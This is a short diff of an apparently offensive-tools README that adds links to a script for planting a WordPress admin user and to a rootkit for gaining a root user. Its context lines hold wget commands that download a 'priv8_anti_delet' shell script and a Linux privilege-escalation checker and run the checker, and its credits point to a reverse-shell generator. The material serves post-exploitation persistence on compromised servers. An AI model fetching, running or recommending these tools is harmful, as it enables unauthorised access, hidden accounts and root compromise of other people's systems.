@@ -57,6 +57,7 @@ wget https://raw.githubusercontent.com/t101804/repshare/main/priv8_anti_delet.sh
 wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
 python linuxprivchecker.py -w -o linuxprivchecker.log
 ```
-- [auto-add-admin-user-to-wordpress](https://github.com/t101804/repshare/blob/main/wp_add_admin.php)
-- 
+- [ Auto Add Admin User To Database Wordpress ](https://github.com/t101804/repshare/blob/main/wp_add_admin.php)
+- [ Root Kit - Gain New User With Root Privilages ](https://github.com/bayufedra/rootkit-Ninja)
+
 Credit by [revshell](https://revshells.com) and @CallMeRep and [@haxor1337x](https://github.com/haxor1337x)
